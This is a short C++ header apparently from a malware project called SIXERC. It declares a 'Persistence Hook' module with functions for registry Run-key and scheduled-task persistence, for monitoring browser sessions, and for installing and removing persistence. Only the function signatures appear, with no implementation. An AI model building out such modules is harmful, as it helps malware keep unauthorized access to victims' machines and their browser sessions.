// ============================================================================
// SIXERC — Module 5: Persistence Hook (PH)
// Maintains access across sessions
// ============================================================================

#pragma once

#include "core/types.hpp"
#include <string>

namespace sixerc::ph {

// Install registry-based persistence (Run key)
bool install_registry_persistence(const std::wstring& exe_path);

// Install scheduled task persistence (simplified)
bool install_task_persistence(const std::wstring& exe_path);

// Monitor browser processes for new sessions
void monitor_browser_sessions();

// Full persistence installation
bool establish_persistence();

// Remove persistence
bool remove_persistence();

} // namespace sixerc::ph
